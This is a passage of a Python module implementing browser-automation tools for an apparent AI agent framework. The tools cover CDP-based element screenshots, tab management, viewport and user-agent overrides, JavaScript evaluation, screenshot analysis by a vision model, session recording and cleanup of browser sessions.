    # 通过 JS 取边界矩形（CSS 坐标而非设备像素）。``json.dumps`` 转义 ``ref_id`` 防逃逸出属性引用 selector 注入 JS。
    safe_ref = json.dumps(ref_id)
    rect_js = (
        "(function(){"
        f"const el=document.querySelector('[aria-ref=' + {safe_ref} + ']');"
        "if(!el)return null;"
        "const r=el.getBoundingClientRect();"
        "if(!r.width||!r.height)return null;"
        "return{left:r.left,top:r.top,width:r.width,height:r.height};"
        "})()"
    )
    rect_result = _browser_eval(rect_js, task_id=effective_task_id)
    try:
        rect_parsed = json.loads(rect_result)
    except (json.JSONDecodeError, ValueError):
        return json.dumps({"success": False, "error": "browser_screenshot_element: failed to resolve element position"}, ensure_ascii=False)

    if not rect_parsed.get("success") or rect_parsed.get("result") is None:
        return json.dumps({"success": False, "error": f"browser_screenshot_element: element {normalized_ref} not found. Run browser_snapshot first."}, ensure_ascii=False)

    r = rect_parsed["result"]
    pad = 4  # px padding to avoid clipping borders

    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return json.dumps({"success": False, "error": "browser_screenshot_element requires a CDP-capable backend"}, ensure_ascii=False)

    cdp_result = supervisor.send_cdp(
        "Page.captureScreenshot",
        {"format": "png", "clip": {"x": max(0, r["left"] - pad), "y": max(0, r["top"] - pad), "width": r["width"] + pad * 2, "height": r["height"] + pad * 2, "scale": 1}},
    )
    if not cdp_result.get("ok"):
        return json.dumps({"success": False, "error": f"browser_screenshot_element: CDP error: {cdp_result.get('error', 'unknown')}"}, ensure_ascii=False)

    img_b64 = cdp_result.get("result", {}).get("data")
    if not img_b64:
        return json.dumps({"success": False, "error": "browser_screenshot_element: CDP returned empty image data"}, ensure_ascii=False)

    img_bytes = base64.b64decode(img_b64)
    screenshots_dir = get_spiritagent_dir("cache/screenshots", "browser_screenshots")
    screenshots_dir.mkdir(parents=True, exist_ok=True)
    filename = _safe_save_name(save_as, f"element_{uuid.uuid4().hex[:8]}.png")
    file_path = screenshots_dir / filename
    file_path.write_bytes(img_bytes)

    return json.dumps(
        {"success": True, "path": str(file_path), "width": int(r["width"] + pad * 2), "height": int(r["height"] + pad * 2), "size_bytes": len(img_bytes)},
        ensure_ascii=False,
    )


def _no_active_tab() -> str:
    """为 browser_tab_* 系列工具返回「缺少 CDP 后端」的统一错误 JSON。"""
    return json.dumps({"success": False, "error": "browser_tab_* require a CDP-capable backend (local Chrome or CDP override). Call browser_navigate first."}, ensure_ascii=False)


def browser_tab_new(url: str | None = None, task_id: str | None = None) -> str:
    """新建浏览器标签页并设为活动目标（CDP Target.createTarget，需 CDP 后端）。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_new")
    if url and url.startswith(("http://", "https://")) and not is_safe_url(url):
        return json.dumps({"success": False, "error": f"URL rejected by security policy: {url}"}, ensure_ascii=False)
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.new_tab(url)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    if url and url.startswith(("http://", "https://")):
        tab_id = result.get("tab_id")
        if tab_id:
            info = supervisor.send_cdp("Target.getTargetInfo", {"targetId": tab_id})
            target_url = info.get("result", {}).get("targetInfo", {}).get("url", "")
            if target_url and target_url != url and not check_redirect_url_safety(url, target_url):
                supervisor.close_tab(tab_id)
                return json.dumps({"success": False, "error": f"browser_tab_new: redirect to unsafe URL blocked: {target_url}"}, ensure_ascii=False)
    return json.dumps({"success": True, "tab_id": result.get("tab_id"), "session_id": result.get("session_id")}, ensure_ascii=False)


def browser_tab_switch(tab_id: str, task_id: str | None = None) -> str:
    """把活动标签页切到 tab_id（CDP Target.activateTarget）。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_switch")
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.switch_tab(tab_id)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    return json.dumps({"success": True, "tab_id": result.get("tab_id"), "session_id": result.get("session_id")}, ensure_ascii=False)


def browser_tab_close(tab_id: str | None = None, task_id: str | None = None) -> str:
    """关闭标签页（默认关闭当前活动标签）；若关闭的正是活动标签，CDP 路由会回退到初始页面。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_close")
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.close_tab(tab_id)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    return json.dumps({"success": True, "tab_id": result.get("tab_id", tab_id)}, ensure_ascii=False)


def browser_tab_list(task_id: str | None = None) -> str:
    """列出当前所有打开的浏览器标签页（CDP Target.getTargets）。"""
    if is_camofox_mode():
        return _camofox_unsupported("browser_tab_list")
    effective_task_id = _last_session_key(task_id or "default")
    supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
    if supervisor is None:
        return _no_active_tab()
    result = supervisor.list_tabs()
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    targets = result.get("result", {}).get("targetInfos", [])
    pages = [t for t in targets if t.get("type") == "page"]
    tabs = [{"tab_id": t.get("targetId"), "url": t.get("url", ""), "title": t.get("title", "")} for t in pages]
    active_session, attached = supervisor.get_attached_targets()
    active_tab_id = next((tid for tid, info in attached.items() if info["session_id"] == active_session), None)
    return json.dumps({"success": True, "count": len(tabs), "tabs": tabs, "active_tab_id": active_tab_id, "attached_count": len(attached)}, ensure_ascii=False)


def _no_supervisor_for_overrides() -> str:
    """为 browser_set_* 工具返回「缺少 CDP 后端」的统一错误 JSON。"""
    return json.dumps({"success": False, "error": "browser_set_* require a CDP-capable backend."}, ensure_ascii=False)


def _run_cdp_override(tool_name: str, method: str, params: dict, success_payload: dict, task_id: str | None) -> str:
    """``browser_set_*`` 系列的公共实现：Camofox 拦截 → 查 supervisor → 派发 CDP → 统一 JSON 错误/成功封装。"""
    if is_camofox_mode():
        return _camofox_unsupported(tool_name)
    supervisor = SUPERVISOR_REGISTRY.get(_last_session_key(task_id or "default"))
    if supervisor is None:
        return _no_supervisor_for_overrides()
    result = supervisor.send_cdp(method, params)
    if not result.get("ok"):
        return json.dumps({"success": False, "error": result.get("error", "unknown error")}, ensure_ascii=False)
    return json.dumps({"success": True, **success_payload}, ensure_ascii=False)


def browser_set_viewport(width: int, height: int, device_scale_factor: float = 1.0, mobile: bool = False, task_id: str | None = None) -> str:
    """通过 CDP Emulation.setDeviceMetricsOverride 覆盖浏览器视口尺寸（移动端布局测试用）。"""
    return _run_cdp_override(
        "browser_set_viewport",
        "Emulation.setDeviceMetricsOverride",
        {"width": width, "height": height, "deviceScaleFactor": device_scale_factor, "mobile": mobile},
        {"width": width, "height": height, "device_scale_factor": device_scale_factor, "mobile": mobile},
        task_id,
    )


def browser_set_user_agent(user_agent: str | None = None, platform: str | None = None, accept_language: str | None = None, task_id: str | None = None) -> str:
    """通过 CDP Network.setUserAgentOverride 覆盖后续导航的 UA / platform / Accept-Language；传 None 表示不修改对应字段。"""
    params: dict = {}
    if user_agent is not None:
        params["userAgent"] = user_agent
    if platform is not None:
        params["platform"] = platform
    if accept_language is not None:
        params["acceptLanguage"] = accept_language
    return _run_cdp_override(
        "browser_set_user_agent",
        "Network.setUserAgentOverride",
        params,
        {"user_agent": user_agent, "platform": platform, "accept_language": accept_language},
        task_id,
    )


def browser_set_extra_headers(headers: dict[str, str], task_id: str | None = None) -> str:
    """通过 CDP Network.setExtraHTTPHeaders 整批替换后续导航的额外 HTTP 头（空 dict 清空所有覆盖）。"""
    return _run_cdp_override(
        "browser_set_extra_headers",
        "Network.setExtraHTTPHeaders",
        {"headers": headers},
        {"count": len(headers), "header_names": list(headers.keys())},
        task_id,
    )


def browser_set_geolocation(lat: float, lon: float, accuracy: float = 100.0, task_id: str | None = None) -> str:
    """通过 CDP Emulation.setGeolocationOverride 覆盖 navigator.geolocation；lat=NaN 清除覆盖。"""
    return _run_cdp_override(
        "browser_set_geolocation",
        "Emulation.setGeolocationOverride",
        {"latitude": lat, "longitude": lon, "accuracy": accuracy},
        {"lat": lat, "lon": lon, "accuracy": accuracy},
        task_id,
    )


def browser_console(clear: bool = False, expression: str | None = None, task_id: str | None = None) -> str:
    """读取浏览器控制台/JS 错误日志，或在提供 expression 时直接在页面里执行 JS 表达式。"""
    if expression is not None:
        return _browser_eval(expression, task_id)

    if is_camofox_mode():
        return camofox_console(clear, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    console_args = ["--clear"] if clear else []
    error_args = ["--clear"] if clear else []

    console_result = _run_browser_command(effective_task_id, "console", console_args)
    errors_result = _run_browser_command(effective_task_id, "errors", error_args)

    messages = []
    if console_result.get("success"):
        for msg in console_result.get("data", {}).get("messages", []):
            messages.append({"type": msg.get("type", "log"), "text": msg.get("text", ""), "source": "console"})

    errors = []
    if errors_result.get("success"):
        for err in errors_result.get("data", {}).get("errors", []):
            errors.append({"message": err.get("message", ""), "source": "exception"})

    response = {"success": True, "console_messages": messages, "js_errors": errors, "total_messages": len(messages), "total_errors": len(errors)}
    _copy_fallback_warning(response, console_result)
    if errors_result.get("fallback_warning") and not response.get("fallback_warning"):
        _copy_fallback_warning(response, errors_result)
    return json.dumps(response, ensure_ascii=False)


def _browser_eval(expression: str, task_id: str | None = None) -> str:
    """在当前页面里执行一段 JS 并返回结果（优先走 supervisor 的 CDP WS，没有再退回 CLI 子进程）。"""
    if is_camofox_mode():
        return _camofox_eval(expression, task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Fast path：复用 supervisor 已连接的 CDP WebSocket 跑 Runtime.evaluate（零子进程启动成本，比每调用 fork 一次 agent-browser eval CLI 便宜一个数量级）；没 supervisor 时退回 CLI 路径（如裸 agent-browser 没 CDP 后端）。
    try:
        supervisor = SUPERVISOR_REGISTRY.get(effective_task_id)
        if supervisor is not None:
            sup_result = supervisor.evaluate_runtime(expression)
            if sup_result.get("ok"):
                raw_result = sup_result.get("result")
                # Match the agent-browser path: if the value is a JSON string,
                # parse it so the model gets structured data.
                parsed = raw_result
                if isinstance(raw_result, str):
                    with contextlib.suppress(json.JSONDecodeError, ValueError):
                        parsed = json.loads(raw_result)
                response = {"success": True, "result": parsed, "result_type": type(parsed).__name__, "method": "cdp_supervisor"}
                return json.dumps(response, ensure_ascii=False, default=str)
            # JS exception is a real failure — surface it instead of falling
            # through to the subprocess path (which would just re-run and
            # produce the same exception, but slower).
            err = sup_result.get("error") or "evaluate_runtime failed"
            if "supervisor" not in err.lower():
                # Real JS-side error — return it.
                return json.dumps({"success": False, "error": err}, ensure_ascii=False)
            # Supervisor-side failure (loop down, no session) — fall through.
            logger.debug("browser_eval: supervisor path unavailable (%s), falling back to subprocess", err)
    except ImportError:
        pass
    except Exception as exc:  # pragma: no cover — defensive
        logger.debug("browser_eval: supervisor path errored (%s), falling back", exc)

    # 回退：agent-browser CLI 子进程（原路径）
    result = _run_browser_command(effective_task_id, "eval", [expression])

    if not result.get("success"):
        err = result.get("error", "eval failed")

        if any(hint in err.lower() for hint in ("unknown command", "not supported", "not found", "no such command")):
            response = {"success": False, "error": f"JavaScript evaluation is not supported by this browser backend. {err}"}
            return json.dumps(_copy_fallback_warning(response, result))
        # A live DOM node / NodeList / Window can't be JSON-serialized by CDP
        # and fails the eval with "Object reference chain is too long".  The
        # supervisor fast path retries with returnByValue=false, but the CLI
        # subprocess can't, so turn the cryptic protocol error into actionable
        # guidance instead of surfacing it raw.
        if "reference chain is too long" in err.lower():
            response = {
                "success": False,
                "error": (
                    "Expression returned a live DOM node / NodeList / Window, "
                    "which can't be serialized. Extract a primitive value "
                    "(e.g. .innerText, .href, .src, .value) or use "
                    "JSON.stringify() / a snapshot tool instead."
                ),
            }
            return json.dumps(_copy_fallback_warning(response, result))
        response = {"success": False, "error": err}
        return json.dumps(_copy_fallback_warning(response, result))

    data = result.get("data", {})
    raw_result = data.get("result")

    # eval 命令把 JS 结果作为字符串返回；若该字符串是合法 JSON 就解析出来，让模型拿到结构化数据。
    parsed = raw_result
    if isinstance(raw_result, str):
        with contextlib.suppress(json.JSONDecodeError, ValueError):
            parsed = json.loads(raw_result)

    response = {"success": True, "result": parsed, "result_type": type(parsed).__name__}
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False, default=str)


def _camofox_eval(expression: str, task_id: str | None = None) -> str:
    """通过 Camofox 的 /tabs/{tab_id}/evaluate 端点执行 JS（旧版 Camofox 可能不支持，会优雅降级）。"""

    try:
        tab_info = _ensure_tab(task_id or "default")
        tab_id = tab_info.get("tab_id") or tab_info.get("id")
        resp = _post(f"/tabs/{tab_id}/evaluate", body={"expression": expression, "userId": tab_info["user_id"]})

        raw_result = resp.get("result") if isinstance(resp, dict) else resp
        parsed = raw_result
        if isinstance(raw_result, str):
            with contextlib.suppress(json.JSONDecodeError, ValueError):
                parsed = json.loads(raw_result)

        return json.dumps({"success": True, "result": parsed, "result_type": type(parsed).__name__}, ensure_ascii=False, default=str)
    except Exception as e:
        error_msg = str(e)
        # Graceful degradation — server may not support eval
        if any(code in error_msg for code in ("404", "405", "501")):
            return json.dumps(
                {
                    "success": False,
                    "error": "JavaScript evaluation is not supported by this Camofox server. Use browser_snapshot or browser_vision to inspect page state.",
                },
            )
        return tool_error(error_msg, success=False)


def _maybe_start_recording(task_id: str) -> None:
    """当 browser.record_sessions 启用时为当前 task 启动自动录屏。"""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        spiritagent_home = get_spiritagent_home()
        record_enabled = cfg_get(load_config(), "browser", "record_sessions", default=False)

        if not record_enabled:
            return

        recordings_dir = spiritagent_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str) -> None:
    """如果 task 当前在录屏则停止。"""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: str | None = None) -> str:
    """列出当前页面所有图片（src、alt、宽高）。"""
    if is_camofox_mode():
        return camofox_get_images(task_id)

    effective_task_id = _last_session_key(task_id or "default")

    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            images = json.loads(raw_result) if isinstance(raw_result, str) else raw_result

            response = {"success": True, "images": images, "count": len(images)}
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        except json.JSONDecodeError:
            response = {"success": True, "images": [], "count": 0, "warning": "Could not parse image data"}
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {"success": False, "error": result.get("error", "Failed to get images")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: str | None = None) -> str | dict[str, Any]:
    """截图当前页面并请视觉模型回答 question；返回分析文本与截图路径（可经 MEDIA:<path> 发给用户）。"""
    if is_camofox_mode():
        return camofox_vision(question, annotate, task_id)

    screenshots_dir = get_spiritagent_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid.uuid4().hex}.png"
    effective_task_id = _last_session_key(task_id or "default")

    # Lightpanda 没有图形渲染器——预先把截图路由到 Chrome fallback helper，避免常规路径返回 CDP 错误或占位 PNG。后续的 base64 编码、provider routing、resize 重试、脱敏、响应组装仍由常规分析路径负责。
    engine = _get_browser_engine()
    _lp_prerouted = False
    _lp_fallback_warning = None
    if engine == "lightpanda" and _should_inject_engine(engine):
        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        fb_result = _chrome_fallback_screenshot(effective_task_id, screenshot_args, _get_command_timeout())
        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
        if fb_result.get("success"):
            _lp_prerouted = True
            _lp_fallback_warning = fb_result.get("fallback_warning")
            fb_path = fb_result.get("data", {}).get("path", "")
            if fb_path and os.path.exists(fb_path):
                screenshots_dir = get_spiritagent_dir("cache/screenshots", "browser_screenshots")
                screenshots_dir.mkdir(parents=True, exist_ok=True)

                persistent_path = screenshots_dir / f"browser_screenshot_{uuid.uuid4().hex}.png"
                shutil.copy2(fb_path, persistent_path)
                screenshot_path = persistent_path
        else:
            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
            # can still produce the standard fallback metadata/error.
            _lp_prerouted = False

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        if _lp_prerouted and screenshot_path.exists():
            result = {
                "success": True,
                "data": {
                    "path": str(screenshot_path),
                    "fallback_warning": _lp_fallback_warning,
                    "browser_engine": "chrome",
                    "browser_engine_fallback": {
                        "from": "lightpanda",
                        "to": "chrome",
                        "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                    },
                },
                "fallback_warning": _lp_fallback_warning,
                "browser_engine": "chrome",
                "browser_engine_fallback": {
                    "from": "lightpanda",
                    "to": "chrome",
                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                },
            }
        else:
            screenshot_args = []
            if annotate:
                screenshot_args.append("--annotate")
            screenshot_args.append("--full")
            screenshot_args.append(str(screenshot_path))
            result = _run_browser_command(
                effective_task_id,
                "screenshot",
                screenshot_args,
                # If the Lightpanda pre-route already failed, force Chrome so
                # _run_browser_command doesn't trigger a redundant LP fallback.
                _engine_override="auto" if _lp_prerouted else None,
            )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            error_response = {"success": False, "error": f"Failed to take screenshot (local mode): {error_detail}"}
            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        if not screenshot_path.exists():
            return json.dumps(
                {
                    "success": False,
                    "error": (
                        f"Screenshot file was not created at {screenshot_path} (local mode). "
                        f"This may indicate a socket path issue (macOS /var/folders/), "
                        f"a missing Chromium install ('agent-browser install'), "
                        f"or a stale daemon process."
                    ),
                },
                ensure_ascii=False,
            )

        _screenshot_bytes = screenshot_path.read_bytes()
        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
        data_url = f"data:image/png;base64,{_screenshot_b64}"

        vision_prompt = (
            f"You are analyzing a screenshot of a web browser.\n\n"
            f"User's question: {question}\n\n"
            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
            f"If there are interactive elements, describe them. If there are verification challenges "
            f"or CAPTCHAs, describe what type they are and what action might be needed. "
            f"Focus on answering the user's specific question."
        )

        logger.debug("browser_vision: analysing screenshot (%d bytes)", len(_screenshot_bytes))

        # Local vision models (llama.cpp, ollama) can take well over 30s for
        # screenshot analysis, so the default timeout must be generous.
        vision_timeout, vision_temperature = resolve_vision_params()

        call_kwargs = {
            "task": "vision",
            "messages": [{"role": "user", "content": [{"type": "text", "text": vision_prompt}, {"type": "image_url", "image_url": {"url": data_url}}]}],
            "max_tokens": 2000,
            "temperature": vision_temperature,
            "timeout": vision_timeout,
        }
        # Try full-size screenshot; on size-related rejection, downscale and retry.
        try:
            response = call_llm_sync(**call_kwargs)
        except Exception as _api_err:
            if is_image_size_error(_api_err) and len(data_url) > RESIZE_TARGET_BYTES:
                logger.info(
                    "Vision API rejected screenshot (%.1f MB); auto-resizing to ~%.0f MB and retrying...",
                    len(data_url) / (1024 * 1024),
                    RESIZE_TARGET_BYTES / (1024 * 1024),
                )
                data_url = resize_image_for_vision(screenshot_path, mime_type="image/png")
                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
                try:
                    response = call_llm_sync(**call_kwargs)
                except Exception:
                    return {"success": False, "error": "vision API failed on retry"}
            else:
                raise

        analysis = (response or "").strip()
        # Redact secrets the vision LLM may have read from the screenshot.
        analysis = redact_sensitive_text(analysis)
        response_data = {"success": True, "analysis": analysis or "Vision analysis returned no content.", "screenshot_path": str(screenshot_path)}
        _copy_fallback_warning(response_data, result)

        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)

    except Exception as e:
        # Keep the screenshot if it was captured successfully — the failure is
        # in the LLM vision analysis, not the capture.  Deleting a valid
        # screenshot loses evidence the user might need.  The 24-hour cleanup
        # in _cleanup_old_screenshots prevents unbounded disk growth.
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {e!s}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        _copy_fallback_warning(error_info, result if "result" in locals() else {})
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24) -> None:
    """清理超过 max_age_hours 的浏览器截图，每目录每小时最多跑一次。"""
    key = str(screenshots_dir)
    now = time.time()
    if now - _LAST_SCREENSHOT_CLEANUP_BY_DIR.get(key, 0.0) < 3600:
        return
    _LAST_SCREENSHOT_CLEANUP_BY_DIR[key] = now
    try:
        _unlink_files_older_than(screenshots_dir.glob("browser_screenshot_*.png"), now - max_age_hours * 3600)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72) -> None:
    """清理超过 max_age_hours 的浏览器录屏文件，避免磁盘膨胀。"""
    try:
        recordings_dir = get_spiritagent_home() / "browser_recordings"
        if not recordings_dir.exists():
            return
        _unlink_files_older_than(recordings_dir.glob("session_*.webm"), time.time() - max_age_hours * 3600)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


def cleanup_browser(task_id: str | None = None) -> None:
    """清理 task 对应的浏览器会话（含同任务下的 local sidecar 与 Camofox 远端会话），同时停掉对应 CDP supervisor。"""
    if task_id is None:
        task_id = "default"

    # 展开到完整的 session_key 集合：裸 task_id 时把主 key 和已存在的 local sidecar 都收进来。
    if _is_local_sidecar_key(task_id):
        session_keys = [task_id]
        bare_task_id = task_id[: -len(_LOCAL_SUFFIX)]
    else:
        session_keys = [task_id]
        sidecar_key = f"{task_id}{_LOCAL_SUFFIX}"
        with _cleanup_lock:
            if sidecar_key in _active_sessions:
                session_keys.append(sidecar_key)
        bare_task_id = task_id

    for session_key in session_keys:
        _cleanup_single_browser_session(session_key)

    # 仅在清理「裸 task」时才丢掉 last-active 指针——仅回收 sidecar 的中途清理里不要丢。
    if not _is_local_sidecar_key(task_id):
        _last_active_session_key.pop(bare_task_id, None)


def _cleanup_single_browser_session(task_id: str) -> None:
    """仅按 session key 精确回收单个浏览器会话（含 supervisor / Camofox / 守护进程）。"""
    _stop_cdp_supervisor(task_id)

    # 若 Camofox 模式下也清掉对应会话；启用 managed persistence 时不做完整 close（让 profile 与 cookie 在跨 task 间存活），inactivity reaper 仍会释放空闲资源。
    if is_camofox_mode():
        try:
            if not camofox_soft_cleanup(task_id):
                camofox_close(task_id)
        except Exception as e:
            logger.debug("Camofox cleanup for task %s: %s", task_id, e)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # _run_browser_command 需要这条记录才能拼出 close 命令。
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    if session_info:
        logger.debug("Found session for task_id: %s", task_id)

        _maybe_stop_recording(task_id)

        # Try to close via agent-browser first (needs session in _active_sessions).
        # Note: when the active backend is CDP override, the `cdp_url` belongs
        # to a user-supplied browser; the close call may no-op over the local
        # agent-browser CLI but will not tear down the external browser.
        try:
            _run_browser_command(task_id, "close", [], timeout=10)
            logger.debug("agent-browser close command completed for task %s", task_id)
        except Exception as e:
            logger.warning("agent-browser close failed for task %s: %s", task_id, e)

        with _cleanup_lock:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        session_name = session_info.get("session_name", "")
        if session_name:
            socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
            if os.path.exists(socket_dir):
                # agent-browser writes {session}.pid in the socket dir
                pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                if os.path.isfile(pid_file):
                    try:
                        daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                        ProcessRegistry._terminate_host_pid(daemon_pid)
                        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                    except (ProcessLookupError, ValueError, PermissionError, OSError):
                        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
                shutil.rmtree(socket_dir, ignore_errors=True)

        logger.debug("Removed task %s from active sessions", task_id)
    else:
        logger.debug("No active session found for task_id: %s", task_id)


def cleanup_all_browsers() -> None:
    """清理所有活动浏览器会话并停掉全部 CDP supervisor，重置各缓存（用于进程退出）。"""
    with _cleanup_lock:
        task_ids = list(_active_sessions.keys())
    for task_id in task_ids:
        cleanup_browser(task_id)

    with contextlib.suppress(Exception):
        SUPERVISOR_REGISTRY.stop_all()

    global _cached_agent_browser, _agent_browser_resolved
    global _CACHED_COMMAND_TIMEOUT, _COMMAND_TIMEOUT_RESOLVED
    global _cached_chromium_installed
    global _cached_browser_engine, _browser_engine_resolved
    _cached_agent_browser = None
    _agent_browser_resolved = False
    _discover_homebrew_node_dirs.cache_clear()
    _CACHED_COMMAND_TIMEOUT = None
    _COMMAND_TIMEOUT_RESOLVED = False
    _cached_chromium_installed = None
    _cached_browser_engine = None
    _browser_engine_resolved = False


def _chromium_search_roots() -> list[str]:
    """按 agent-browser/Playwright 实际探测顺序返回可能的 Chromium / headless-shell 根目录。"""
    roots: list[str] = []
    env_path = str(cfg_get(load_config(), "browser", "playwright_browsers_path", default="")).strip()
    if env_path and env_path != "0":
        roots.append(env_path)
    home = os.path.expanduser("~")
    roots.append(os.path.join(home, ".cache", "ms-playwright"))
    if sys.platform == "darwin":
        roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA") or os.path.join(home, "AppData", "Local")
        roots.append(os.path.join(local, "ms-playwright"))
    return roots


def _chromium_installed() -> bool:
    """检查磁盘上是否有可用的 Chromium / headless-shell：先看 ``executable_path`` → 系统 PATH → Playwright 缓存（cached）。"""
    global _cached_chromium_installed
    if _cached_chromium_installed is not None:
        return _cached_chromium_installed

    # 1. config["browser"]["executable_path"]：用户显式指定的浏览器二进制。
    ab_path = str(cfg_get(load_config(), "browser", "executable_path", default="")).strip()
    if ab_path and (os.path.isfile(ab_path) or shutil.which(ab_path)):
        _cached_chromium_installed = True
        return True

    # 2. 系统 PATH 上的 Chrome/Chromium（常见名称）。
    system_chrome = shutil.which("google-chrome") or shutil.which("chromium") or shutil.which("chromium-browser") or shutil.which("chrome")
    if system_chrome:
        _cached_chromium_installed = True
        return True

    # 3. Playwright 浏览器缓存（旧版：chromium-* / chromium_headless_shell-* 目录）。
    for root in _chromium_search_roots():
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
        except OSError:
            continue
        # Playwright names them ``chromium-<build>`` and
        # ``chromium_headless_shell-<build>``; agent-browser accepts either.
        for entry in entries:
            if entry.startswith("chromium-") or entry.startswith("chromium_headless_shell-"):
                _cached_chromium_installed = True
                return True

    _cached_chromium_installed = False
    return False


def check_browser_requirements() -> bool:
    """检查浏览器工具前置依赖：Camofox 只需 URL；CDP 覆盖需 cdp_url；本地模式需 agent-browser CLI（默认 Chrome 还需 Chromium，Lightpanda 文本流程不需要）。"""
    if is_camofox_mode():
        return True

    if _get_cdp_override():
        return True

    try:
        _find_agent_browser()
    except FileNotFoundError:
        return False

    # Local + Lightpanda 模式：文本/导航工具无需本地 Chromium；Chrome fallback、截图、browser_vision 仍会在被调用时返回可操作的 Chromium 安装错误。
    if _using_lightpanda_engine():
        return True

    # Local Chrome 模式：agent-browser 需要磁盘上有 Chromium；否则首次调用 CLI 会挂起到命令超时触发。
    return _chromium_installed()


_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}

registry.register_tool("browser_navigate", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_navigate"))(
